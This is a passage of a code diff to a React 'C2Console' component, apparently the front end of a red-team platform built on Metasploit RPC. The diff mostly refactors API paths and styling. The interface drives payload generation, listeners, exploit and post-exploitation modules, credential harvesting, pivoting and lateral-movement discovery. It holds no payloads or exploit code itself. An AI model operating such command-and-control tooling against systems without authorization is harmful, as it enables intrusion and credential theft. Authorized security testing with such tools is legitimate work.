       const payload = payloads.find(p => p.value === selPayload)
-      const res = await fetch('/api/v1/c2/payloads/generate', {
+      const res = await fetch(`${getApiBase()}/c2/payloads/generate`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -629,7 +760,7 @@ export default function C2Console() {
   async function handleStartListener() {
     setStartingListener(true)
     try {
-      const res = await fetch('/api/v1/c2/listeners/start', {
+      const res = await fetch(`${getApiBase()}/c2/listeners/start`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ payload: listenerPayload, lhost: listenerLhost, lport: parseInt(listenerLport) }),
@@ -646,20 +777,20 @@ export default function C2Console() {
   }
 
   async function handleStopListener(jobId: string) {
-    await fetch(`/api/v1/c2/listeners/${jobId}`, { method: 'DELETE' })
+    await fetch(`${getApiBase()}/c2/listeners/${jobId}`, { method: 'DELETE' })
     loadListeners()
   }
 
   async function handleGenerateAttackPlan() {
-    if (!selectedProject) return
+    if (!projectId) return
     setGeneratingAttack(true)
     setAttackPlanError('')
     setAttackPlan(null)
     try {
-      const res = await fetch('/api/v1/c2/attack-plan', {
+      const res = await fetch(`${getApiBase()}/c2/attack-plan`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ project_id: selectedProject, lhost }),
+        body: JSON.stringify({ project_id: projectId, lhost }),
       })
       const data = await res.json()
       if (!res.ok) { setAttackPlanError(data.detail || 'Failed to generate plan'); return }
@@ -675,9 +806,9 @@ export default function C2Console() {
     if (sessionPollRef.current) clearInterval(sessionPollRef.current)
     const deadline = Date.now() + 60_000
     sessionPollRef.current = setInterval(async () => {
-      if (!selectedProject) return
-      await fetch(`/api/v1/c2/sessions/sync?project_id=${selectedProject}`, { method: 'POST' })
-      const res = await fetch(`/api/v1/c2/sessions?project_id=${selectedProject}`)
+      if (!projectId) return
+      await fetch(`${getApiBase()}/c2/sessions/sync?project_id=${projectId}`, { method: 'POST' })
+      const res = await fetch(`${getApiBase()}/c2/sessions?project_id=${projectId}`)
       if (res.ok) {
         const data: C2Session[] = await res.json()
         setSessions(data)
@@ -710,14 +841,14 @@ export default function C2Console() {
     setRunningModule(idx)
     setModuleResults(prev => { const n = { ...prev }; delete n[idx]; return n })
     try {
-      const res = await fetch('/api/v1/c2/run-module', {
+      const res = await fetch(`${getApiBase()}/c2/run-module`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           module: rec.module,
           options: rec.options,
           payload: rec.payload,
-          project_id: selectedProject,
+          project_id: projectId,
         }),
       })
       const data = await res.json()
@@ -747,7 +878,7 @@ export default function C2Console() {
     setExpandedHistory(prev => new Set(prev).add(entryId))
     terminalRef.current?.writeln(`\x1b[33m[*] ${mod.label}\x1b[0m`)
     try {
-      const res = await fetch('/api/v1/c2/post-modules/run', {
+      const res = await fetch(`${getApiBase()}/c2/post-modules/run`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ session_id: activeSession.id, module_name: mod.name }),
@@ -780,8 +911,7 @@ export default function C2Console() {
 
   function connectTerminal(session: C2Session) {
     wsRef.current?.close()
-    const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:'
-    const ws = new WebSocket(`${wsProto}//${window.location.host}/ws/c2/${session.id}`)
+    const ws = new WebSocket(wsUrl(`/ws/c2/${session.id}`))
     wsRef.current = ws
     terminalRef.current?.clear()
 
@@ -803,18 +933,18 @@ export default function C2Console() {
   }
 
   async function loadChecklist(sessionId: string) {
-    const res = await fetch(`/api/v1/c2/sessions/${sessionId}/checklist`)
+    const res = await fetch(`${getApiBase()}/c2/sessions/${sessionId}/checklist`)
     if (res.ok) setChecklist(await res.json())
   }
 
   async function loadRoutes(sessionId: string) {
-    const res = await fetch(`/api/v1/c2/sessions/${sessionId}/routes`)
+    const res = await fetch(`${getApiBase()}/c2/sessions/${sessionId}/routes`)
     if (res.ok) setPivotRoutes(await res.json())
   }
 
   async function toggleChecklistItem(itemId: string, done: boolean) {
     if (!activeSession) return
-    const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/checklist/${itemId}`, {
+    const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/checklist/${itemId}`, {
       method: 'PATCH',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ done }),
@@ -827,7 +957,7 @@ export default function C2Console() {
     setHarvesting(true)
     setHarvestOutput('')
     try {
-      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/harvest-creds`, { method: 'POST' })
+      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/harvest-creds`, { method: 'POST' })
       const data = await res.json()
       if (res.ok) {
         setHarvestOutput(data.output + `\n\n[+] ${data.creds_saved} credential(s) saved to vault.`)
@@ -848,7 +978,7 @@ export default function C2Console() {
     setUpgrading(true)
     setUpgradeOutput('')
     try {
-      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/upgrade`, { method: 'POST' })
+      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/upgrade`, { method: 'POST' })
       if (!res.body) throw new Error('No stream body')
       const reader = res.body.getReader()
       const decoder = new TextDecoder()
@@ -877,7 +1007,7 @@ export default function C2Console() {
     setScreenshotting(true)
     setScreenshotResult('')
     try {
-      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/screenshot`, { method: 'POST' })
+      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/screenshot`, { method: 'POST' })
       const data = await res.json()
       if (res.ok) {
         setScreenshotResult(`Screenshot saved: ${data.path}`)
@@ -897,7 +1027,7 @@ export default function C2Console() {
     if (!activeSession || !newRouteSubnet) return
     setAddingRoute(true)
     try {
-      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/routes`, {
+      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/routes`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ subnet: newRouteSubnet, netmask: newRouteNetmask }),
@@ -913,7 +1043,7 @@ export default function C2Console() {
 
   async function handleRemoveRoute(routeId: string) {
     if (!activeSession) return
-    const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/routes/${routeId}`, { method: 'DELETE' })
+    const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/routes/${routeId}`, { method: 'DELETE' })
     if (res.ok) setPivotRoutes(await res.json())
   }
 
@@ -923,13 +1053,13 @@ export default function C2Console() {
     setProbeOutput('Running auto-probe… (this may take up to 90s)')
     const sid = activeSession.id
     const startedAt = new Date().toISOString()
-    await fetch(`/api/v1/c2/sessions/${sid}/auto-probe`, { method: 'POST' })
+    await fetch(`${getApiBase()}/c2/sessions/${sid}/auto-probe`, { method: 'POST' })
     // Probe runs as a background task (5 commands × up to 15s each = ~75s worst case).
     // Poll every 8s; once the system_info loot entry appears, surface it here.
     let ticks = 0
     const poll = setInterval(async () => {
       ticks++
-      const res = await fetch(`/api/v1/c2/loot?project_id=${selectedProject}`)
+      const res = await fetch(`${getApiBase()}/c2/loot?project_id=${projectId}`)
       if (res.ok) {
         const entries: LootEntry[] = await res.json()
         setLoot(entries)
@@ -957,7 +1087,7 @@ export default function C2Console() {
     if (!activeSession) return
     setDiscoveringLateral(true)
     try {
-      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/lateral-discover`, { method: 'POST' })
+      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/lateral-discover`, { method: 'POST' })
       if (res.ok) setLateralResult(await res.json())
     } finally {
       setDiscoveringLateral(false)
@@ -968,14 +1098,14 @@ export default function C2Console() {
     if (!activeSession || !sysinfoRaw.trim()) return
     setParsingSysinfo(true)
     try {
-      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/sysinfo`, {
+      const res = await fetch(`${getApiBase()}/c2/sessions/${activeSession.id}/sysinfo`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ raw_output: sysinfoRaw }),
       })
       if (res.ok) {
         // Refresh session list so sysinfo panel updates
-        const sesRes = await fetch(`/api/v1/c2/sessions?project_id=${selectedProject}`)
+        const sesRes = await fetch(`${getApiBase()}/c2/sessions?project_id=${projectId}`)
         if (sesRes.ok) {
           const updated: C2Session[] = await sesRes.json()
           setSessions(updated)
@@ -995,67 +1125,67 @@ export default function C2Console() {
     setTimeout(() => setCopied(''), 2000)
   }
 
-  const LOOT_COLORS: Record<string, string> = {
-    credential: 'text-amber-400 border-amber-500/30 bg-amber-950/30',
-    hash: 'text-red-400 border-red-500/30 bg-red-950/30',
-    file: 'text-blue-400 border-blue-500/30 bg-blue-950/30',
-    key: 'text-purple-400 border-purple-500/30 bg-purple-950/30',
-    secret: 'text-orange-400 border-orange-500/30 bg-orange-950/30',
-    system_info: 'text-cyan-400 border-cyan-500/30 bg-cyan-950/20',
+  const LOOT_STYLES: Record<string, { color: string; border: string; background: string }> = {
+    credential: { color: 'var(--accent)',  border: '1px solid rgba(240,168,58,0.3)', background: 'rgba(240,168,58,0.08)' },
+    hash:       { color: 'var(--crit)',    border: '1px solid rgba(232,64,64,0.3)',  background: 'rgba(232,64,64,0.08)' },
+    file:       { color: 'var(--med)',      border: '1px solid rgba(180,130,60,0.3)',  background: 'rgba(180,130,60,0.08)' },
+    key:        { color: '#a78bfa',        border: '1px solid rgba(167,139,250,0.3)', background: 'rgba(167,139,250,0.08)' },
+    secret:     { color: '#fb923c',        border: '1px solid rgba(251,146,60,0.3)', background: 'rgba(251,146,60,0.08)' },
+    system_info:{ color: 'var(--accent)',  border: '1px solid rgba(240,168,58,0.3)', background: 'rgba(240,168,58,0.06)' },
   }
 
-  const inputClass = "bg-[#05080d] border border-cyan-900/30 rounded px-3 py-2 text-sm text-slate-200 focus:outline-none focus:border-cyan-500/50 w-full"
+  const inputClass: React.CSSProperties = { border: ruleStrong, borderRadius: 4, padding: '8px 12px', fontSize: 13, outline: 'none', width: '100%', background: 'var(--bg)', color: 'var(--fg)', fontFamily: 'var(--font-sans)', boxSizing: 'border-box' }
 
   return (
-    <div className="flex h-full gap-4 overflow-hidden">
+    <div style={{ display: 'flex', height: '100%', gap: 16, overflow: 'hidden' }}>
       {/* Left panel */}
-      <div className="w-72 flex-shrink-0 flex flex-col gap-3 min-h-0">
+      <div style={{ width: 288, flexShrink: 0, display: 'flex', flexDirection: 'column', gap: 12, minHeight: 0 }}>
 
         {/* MSF Connection status */}
-        <div className={`glass rounded-xl p-4 border ${msfStatus.connected ? 'border-green-500/20' : 'border-red-500/20'}`}>
-          <div className="flex items-center gap-2 mb-3">
+        <div style={{ background: 'var(--bg-2)', border: msfStatus.connected ? '1px solid rgba(84,175,97,0.2)' : '1px solid rgba(232,64,64,0.2)', borderRadius: 4, padding: 16 }}>
+          <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
             {msfStatus.connected
-              ? <Wifi size={16} className="text-green-400" />
-              : <WifiOff size={16} className="text-red-400" />
+              ? <Icon name="wifi" size={16} style={{ color: 'var(--ok)' }} />
+              : <Icon name="wifi" size={16} style={{ color: 'var(--crit)' }} />
             }
-            <span className="text-sm font-semibold text-slate-200">Metasploit RPC</span>
+            <span style={{ fontSize: 13, fontWeight: 600, color: 'var(--fg-2)' }}>Metasploit RPC</span>
             {msfStatus.connected && (
-              <span className="ml-auto text-xs font-mono text-green-400">v{msfStatus.version}</span>
+              <span style={{ marginLeft: 'auto', fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--ok)' }}>v{msfStatus.version}</span>
             )}
           </div>
 
           {msfStatus.connected ? (
-            <div className="grid grid-cols-2 gap-2">
-              <div className="bg-[#05080d] rounded-lg p-2 text-center border border-cyan-900/20">
-                <div className="text-xl font-bold font-mono text-cyan-400">{msfStatus.sessions}</div>
-                <div className="text-[10px] text-slate-500">Sessions</div>
+            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
+              <div style={{ borderRadius: 4, padding: 8, textAlign: 'center', border: ruleStrong }}>
+                <div style={{ fontSize: 20, fontWeight: 700, fontFamily: 'var(--font-mono)', color: 'var(--accent)' }}>{msfStatus.sessions}</div>
+                <div style={{ fontSize: 10, color: 'var(--fg-3)' }}>Sessions</div>
               </div>
-              <div className="bg-[#05080d] rounded-lg p-2 text-center border border-cyan-900/20">
-                <div className="text-xl font-bold font-mono text-amber-400">{msfStatus.jobs}</div>
-                <div className="text-[10px] text-slate-500">Jobs</div>
+              <div style={{ borderRadius: 4, padding: 8, textAlign: 'center', border: ruleStrong }}>
+                <div style={{ fontSize: 20, fontWeight: 700, fontFamily: 'var(--font-mono)', color: 'var(--accent)' }}>{msfStatus.jobs}</div>
+                <div style={{ fontSize: 10, color: 'var(--fg-3)' }}>Jobs</div>
               </div>
             </div>
           ) : (
-            <div className="space-y-2">
-              <div className="grid grid-cols-2 gap-2">
+            <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8 }}>
                 <div>
-                  <label className="text-[10px] text-slate-500 mb-1 block">Host</label>
-                  <input value={msfHost} onChange={e => setMsfHost(e.target.value)} className={inputClass} placeholder="127.0.0.1" />
+                  <label style={{ fontSize: 10, color: 'var(--fg-3)', display: 'block', marginBottom: 4 }}>Host</label>
+                  <input value={msfHost} onChange={e => setMsfHost(e.target.value)} style={inputClass} placeholder="127.0.0.1" />
                 </div>
                 <div>
-                  <label className="text-[10px] text-slate-500 mb-1 block">Port</label>
-                  <input value={msfPort} onChange={e => setMsfPort(e.target.value)} className={inputClass} placeholder="55553" />
+                  <label style={{ fontSize: 10, color: 'var(--fg-3)', display: 'block', marginBottom: 4 }}>Port</label>
+                  <input value={msfPort} onChange={e => setMsfPort(e.target.value)} style={inputClass} placeholder="55553" />
                 </div>
               </div>
               <div>
-                <label className="text-[10px] text-slate-500 mb-1 block">Password</label>
-                <input type="password" value={msfPass} onChange={e => setMsfPass(e.target.value)} className={inputClass} placeholder="msfrpcd password" />
+                <label style={{ fontSize: 10, color: 'var(--fg-3)', display: 'block', marginBottom: 4 }}>Password</label>
+                <input type="password" value={msfPass} onChange={e => setMsfPass(e.target.value)} style={inputClass} placeholder="msfrpcd password" />
               </div>
-              {connectError && <p className="text-xs text-red-400">{connectError}</p>}
+              {connectError && <p style={{ fontSize: 11, color: 'var(--crit)' }}>{connectError}</p>}
               <button
                 onClick={handleConnect}
                 disabled={connecting}
-                className="w-full py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-50 text-sm text-white font-medium transition-all hover:shadow-glow-cyan"
+                style={{ width: '100%', padding: '8px 0', borderRadius: 4, border: 'none', fontSize: 13, fontWeight: 500, cursor: connecting ? 'not-allowed' : 'pointer', opacity: connecting ? 0.5 : 1, background: 'var(--accent)', color: '#0d0c0a', fontFamily: 'var(--font-sans)' }}
               >
                 {connecting ? 'Connecting...' : 'Connect to MSF'}
               </button>
@@ -1063,59 +1193,50 @@ export default function C2Console() {
           )}
         </div>
 
-        {/* Project selector */}
-        <div className="glass glass-hover rounded-xl p-4">
-          <label className="text-xs text-slate-500 mb-2 block">Project</label>
-          <select className={inputClass} value={selectedProject} onChange={e => setSelectedProject(e.target.value)}>
-            <option value="">Select project...</option>
-            {projects.map(p => <option key={p.id} value={p.id}>{p.name}</option>)}
-          </select>
-        </div>
-
         {/* Session list */}
-        <div className="glass rounded-xl flex-1 flex flex-col min-h-0 overflow-hidden">
-          <div className="px-4 py-3 border-b border-cyan-900/20 flex-shrink-0 flex items-center justify-between">
-            <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider">Sessions</span>
-            <div className="flex gap-1">
-              <button onClick={handleSync} disabled={loading || !msfStatus.connected} title="Sync from MSF" className="text-slate-500 hover:text-cyan-400 transition-colors p-1 disabled:opacity-40">
-                <RefreshCw size={13} className={loading ? 'animate-spin' : ''} />
-              </button>
-            </div>
+        <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0, overflow: 'hidden' }}>
+          <div style={{ padding: '12px 16px', borderBottom: rule, flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+            <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em' }}>Sessions</span>
+            <button onClick={handleSync} disabled={loading || !msfStatus.connected} title="Sync from MSF" style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 4, opacity: (loading || !msfStatus.connected) ? 0.4 : 1 }}>
+              <Icon name="refresh" size={13} className={loading ? 'animate-spin' : ''} />
+            </button>
           </div>
-          <div className="overflow-y-auto flex-1">
+          <div style={{ overflowY: 'auto', flex: 1 }}>
             {sessions.length === 0 ? (
-              <div className="text-center text-slate-600 py-8 px-4 text-xs">
-                <Shield size={28} className="mx-auto mb-2 opacity-20" />
+              <div style={{ textAlign: 'center', color: 'var(--fg-4)', padding: '32px 16px', fontSize: 11 }}>
+                <Icon name="shield" size={28} style={{ margin: '0 auto 8px', opacity: 0.2 }} />
                 No sessions yet. Sync from MSF or add manually.
               </div>
             ) : sessions.map(s => (
               <div
                 key={s.id}
                 onClick={() => setActiveSession(s)}
-                className={`flex items-start gap-3 px-4 py-3 cursor-pointer border-b border-cyan-900/10 transition-colors ${
-                  activeSession?.id === s.id ? 'bg-cyan-900/10 border-l-2 border-l-cyan-500' : 'hover:bg-cyan-950/10'
-                }`}
+                style={{
+                  display: 'flex', alignItems: 'flex-start', gap: 12, padding: '12px 16px', cursor: 'pointer',
+                  borderBottom: rule, borderLeft: activeSession?.id === s.id ? '2px solid var(--accent)' : '2px solid transparent',
+                  background: activeSession?.id === s.id ? 'rgba(240,168,58,0.05)' : 'none',
+                }}
               >
-                <TerminalIcon size={14} className={`mt-0.5 flex-shrink-0 ${s.status === 'active' && s.live ? 'text-green-400' : s.status === 'lost' ? 'text-red-400' : 'text-slate-600'}`} />
-                <div className="flex-1 min-w-0">
-                  <div className="flex items-center justify-between gap-2">
-                    <span className="text-xs font-mono text-slate-200 truncate">
+                <Icon name="terminal" size={14} style={{ marginTop: 2, flexShrink: 0, color: s.status === 'active' && s.live ? 'var(--ok)' : s.status === 'lost' ? 'var(--crit)' : 'var(--fg-4)' }} />
+                <div style={{ flex: 1, minWidth: 0 }}>
+                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8 }}>
+                    <span style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: 'var(--fg-2)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                       {s.remote_host || 'unknown'}
-                      {s.msf_session_id && <span className="text-slate-600 ml-1">#{s.msf_session_id}</span>}
+                      {s.msf_session_id && <span style={{ color: 'var(--fg-4)', marginLeft: 4 }}>#{s.msf_session_id}</span>}
                     </span>
-                    <div className="flex items-center gap-1.5">
+                    <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                       <SessionStatusBadge status={s.status} live={s.live} />
                       <button
                         onClick={e => { e.stopPropagation(); handleKillSession(s) }}
-                        className="text-slate-600 hover:text-red-400 transition-colors"
+                        style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0 }}
                         title="Kill & delete session"
                       >
-                        <X size={12} />
+                        <Icon name="x" size={12} />
                       </button>
                     </div>
                   </div>
-                  <div className="text-[10px] text-slate-500 mt-0.5">{s.session_type} · {s.platform || '?'} · {s.arch || '?'}</div>
-                  {s.via_exploit && <div className="text-[10px] text-slate-600 truncate">{s.via_exploit}</div>}
+                  <div style={{ fontSize: 10, color: 'var(--fg-3)', marginTop: 2 }}>{s.session_type} · {s.platform || '?'} · {s.arch || '?'}</div>
+                  {s.via_exploit && <div style={{ fontSize: 10, color: 'var(--fg-4)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.via_exploit}</div>}
                 </div>
               </div>
             ))}
@@ -1124,39 +1245,44 @@ export default function C2Console() {
       </div>
 
       {/* Main panel */}
-      <div className="flex-1 flex flex-col min-w-0 min-h-0">
+      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minWidth: 0, minHeight: 0 }}>
         {/* Tabs */}
-        <div className="flex items-center gap-2 mb-3 flex-shrink-0">
-          <div className="flex gap-1 glass rounded-lg p-1">
+        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12, flexShrink: 0 }}>
+          <div style={{ display: 'flex', borderBottom: rule }}>
             {([
-              { id: 'sessions', icon: <TerminalIcon size={13} />, label: 'Console' },
-              { id: 'payloads', icon: <Package size={13} />, label: 'Payloads' },
-              { id: 'listeners', icon: <Radio size={13} />, label: 'Listeners' },
-              { id: 'attack', icon: <Crosshair size={13} />, label: 'Attack Plan' },
-              { id: 'loot', icon: <Database size={13} />, label: `Loot (${loot.length})` },
-            { id: 'postex', icon: <ListChecks size={13} />, label: 'Post-Ex' },
-            { id: 'lotl', icon: <BookOpen size={13} />, label: 'LOTL' },
+              { id: 'sessions', icon: <Icon name="terminal" size={13} />, label: 'Console' },
+              { id: 'payloads', icon: <Icon name="layers" size={13} />, label: 'Payloads' },
+              { id: 'listeners', icon: <Icon name="radio" size={13} />, label: 'Listeners' },
+              { id: 'attack', icon: <Icon name="target" size={13} />, label: 'Attack Plan' },
+              { id: 'loot', icon: <Icon name="layers" size={13} />, label: `Loot (${loot.length})` },
+              { id: 'postex', icon: <Icon name="check" size={13} />, label: 'Post-Ex' },
+              { id: 'lotl', icon: <Icon name="book" size={13} />, label: 'LOTL' },
+              { id: 'infra', icon: <Icon name="layers" size={13} />, label: 'Infrastructure' },
             ] as const).map(tab => (
               <button
                 key={tab.id}
                 onClick={() => setActiveTab(tab.id)}
-                className={`flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-medium transition-colors ${
-                  activeTab === tab.id ? 'bg-cyan-600 text-white shadow-glow-cyan' : 'text-slate-400 hover:text-slate-200'
-                }`}
+                style={{
+                  display: 'flex', alignItems: 'center', gap: 6, padding: '8px 14px', fontSize: 12, fontWeight: 500,
+                  background: 'none', border: 'none', cursor: 'pointer', fontFamily: 'var(--font-sans)',
+                  borderBottom: activeTab === tab.id ? '2px solid var(--accent)' : '2px solid transparent',
+                  marginBottom: -1,
+                  color: activeTab === tab.id ? 'var(--accent)' : 'var(--fg-3)',
+                }}
               >
                 {tab.icon} {tab.label}
               </button>
             ))}
           </div>
           {activeSession && (
-            <div className="ml-auto flex items-center gap-2 text-xs">
-              <span className="font-mono text-cyan-400" style={{ textShadow: '0 0 8px rgba(6,182,212,0.4)' }}>
+            <div style={{ marginLeft: 'auto', display: 'flex', alignItems: 'center', gap: 8, fontSize: 11 }}>
+              <span style={{ fontFamily: 'var(--font-mono)', color: 'var(--accent)' }}>
                 {activeSession.remote_host}:{activeSession.remote_port}
               </span>
-              <span className="text-slate-600">·</span>
-              <span className="text-slate-400">{activeSession.session_type}</span>
-              <button onClick={() => handleKillSession(activeSession)} className="text-slate-600 hover:text-red-400 transition-colors ml-2" title="Kill session">
-                <X size={14} />
+              <span style={{ color: 'var(--fg-4)' }}>·</span>
+              <span style={{ color: 'var(--fg-3)' }}>{activeSession.session_type}</span>
+              <button onClick={() => handleKillSession(activeSession)} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-3)', padding: 0, marginLeft: 8 }} title="Kill session">
+                <Icon name="x" size={14} />
               </button>
             </div>
           )}
@@ -1164,94 +1290,94 @@ export default function C2Console() {
 
         {/* Console tab */}
         {activeTab === 'sessions' && (
-          <div className="flex-1 flex gap-3 min-h-0">
+          <div style={{ flex: 1, display: 'flex', gap: 12, minHeight: 0 }}>
             {/* Terminal */}
-            <div className="flex-1 flex flex-col min-h-0">
+            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minHeight: 0 }}>
               {activeSession ? (
                 <>
-                  <Terminal ref={terminalRef} className="flex-1 rounded-xl overflow-hidden border border-cyan-900/20 shadow-glow-cyan" />
+                  <Terminal ref={terminalRef} style={{ flex: 1, borderRadius: 4, overflow: 'hidden', border: ruleStrong }} />
                   {/* Command input */}
-                  <div className="flex gap-2 mt-2 flex-shrink-0">
-                    <div className="flex items-center gap-2 flex-1 glass rounded-lg px-3 py-2 border border-cyan-900/30">
-                      <span className="text-green-400 font-mono text-xs flex-shrink-0">seraph@c2 &gt;</span>
+                  <div style={{ display: 'flex', gap: 8, marginTop: 8, flexShrink: 0 }}>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: 8, flex: 1, background: 'var(--bg-2)', borderRadius: 4, padding: '8px 12px', border: ruleStrong }}>
+                      <span style={{ color: 'var(--ok)', fontFamily: 'var(--font-mono)', fontSize: 11, flexShrink: 0 }}>seraph@c2 &gt;</span>
                       <input
                         ref={inputRef}
                         value={termInput}
                         onChange={e => setTermInput(e.target.value)}
                         onKeyDown={e => { if (e.key === 'Enter') sendCommand() }}
                         placeholder="Enter command..."
-                        className="flex-1 bg-transparent text-sm text-slate-200 focus:outline-none font-mono placeholder-slate-700"
+                        style={{ flex: 1, background: 'transparent', fontSize: 13, color: 'var(--fg)', outline: 'none', fontFamily: 'var(--font-mono)', border: 'none' }}
                         autoFocus
                       />
                     </div>
-                    <button onClick={sendCommand} className="px-3 rounded-lg bg-cyan-600 hover:bg-cyan-500 text-white transition-all hover:shadow-glow-cyan flex-shrink-0">
-                      <ChevronRight size={16} />
+                    <button onClick={sendCommand} style={{ padding: '0 12px', borderRadius: 4, background: 'var(--accent)', border: 'none', cursor: 'pointer', color: '#0d0c0a', flexShrink: 0 }}>
+                      <Icon name="chev_r" size={16} />
                     </button>
                   </div>
                 </>
               ) : (
-                <div className="flex-1 glass rounded-xl border border-cyan-900/20 flex flex-col items-center justify-center text-slate-600">
-                  <TerminalIcon size={40} className="mb-3 opacity-20 text-cyan-600" />
-                  <p className="text-sm">Select a session from the left to open a console</p>
-                  <p className="text-xs mt-1 text-slate-700">or sync active sessions from Metasploit</p>
+                <div style={{ flex: 1, background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: 'var(--fg-4)' }}>
+                  <Icon name="terminal" size={40} style={{ marginBottom: 12, opacity: 0.2 }} />
+                  <p style={{ fontSize: 13 }}>Select a session from the left to open a console</p>
+                  <p style={{ fontSize: 11, marginTop: 4, color: 'var(--fg-4)' }}>or sync active sessions from Metasploit</p>
                 </div>
               )}
             </div>
 
             {/* Post-exploitation sidebar */}
             {activeSession && (
-              <div className="w-64 flex-shrink-0 flex flex-col gap-2 min-h-0">
+              <div style={{ width: 256, flexShrink: 0, display: 'flex', flexDirection: 'column', gap: 8, minHeight: 0 }}>
                 {/* Sysinfo panel */}
                 {activeSession.sysinfo && (
-                  <div className="glass rounded-xl overflow-hidden flex-shrink-0 border border-cyan-900/20">
-                    <div className="px-3 py-2 border-b border-cyan-900/20 flex items-center justify-between">
-                      <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-1.5">
-                        <Shield size={10} className="text-cyan-500" /> Host Info
+                  <div style={{ background: 'var(--bg-2)', border: ruleStrong, borderRadius: 4, overflow: 'hidden', flexShrink: 0 }}>
+                    <div style={{ padding: '8px 12px', borderBottom: rule, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+                      <span style={{ fontSize: 11, fontWeight: 600, color: 'var(--fg-3)', textTransform: 'uppercase', letterSpacing: '0.08em', display: 'flex', alignItems: 'center', gap: 6 }}>
+                        <Icon name="shield" size={10} style={{ color: 'var(--accent)' }} /> Host Info
                       </span>
                       {activeSession.sysinfo.is_admin && (
-                        <span className="text-[10px] font-bold text-yellow-400 bg-yellow-900/30 px-1.5 py-0.5 rounded">ADMIN</span>
+                        <span style={{ fontSize: 10, fontWeight: 700, color: '#fbbf24', background: 'rgba(251,191,36,0.1)', padding: '1px 6px', borderRadius: 3 }}>ADMIN</span>
                       )}
                     </div>
-                    <div className="p-2 space-y-1 text-[11px] font-mono">
+                    <div style={{ padding: 8, display: 'flex', flexDirection: 'column', gap: 4, fontSize: 11, fontFamily: 'var(--font-mono)' }}>
                       {activeSession.sysinfo.hostname && (
-                        <div className="flex gap-1.5">
-                          <span className="text-slate-600 w-16 flex-shrink-0">hostname</span>
-                          <span className="text-cyan-300 truncate">{activeSession.sysinfo.hostname}</span>
+                        <div style={{ display: 'flex', gap: 6 }}>
+                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>hostname</span>
+                          <span style={{ color: 'var(--accent)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{activeSession.sysinfo.hostname}</span>
                         </div>
                       )}
                       {activeSession.sysinfo.os && (
-                        <div className="flex gap-1.5">
-                          <span className="text-slate-600 w-16 flex-shrink-0">os</span>
-                          <span className="text-slate-300 truncate" title={activeSession.sysinfo.os}>{activeSession.sysinfo.os}</span>
+                        <div style={{ display: 'flex', gap: 6 }}>
+                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>os</span>
+                          <span style={{ color: 'var(--fg-2)', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={activeSession.sysinfo.os}>{activeSession.sysinfo.os}</span>
                         </div>
                       )}
                       {activeSession.sysinfo.arch && (
-                        <div className="flex gap-1.5">
-                          <span className="text-slate-600 w-16 flex-shrink-0">arch</span>
-                          <span className="text-slate-300">{activeSession.sysinfo.arch}</span>
+                        <div style={{ display: 'flex', gap: 6 }}>
+                          <span style={{ color: 'var(--fg-4)', width: 64, flexShrink: 0 }}>arch</span>
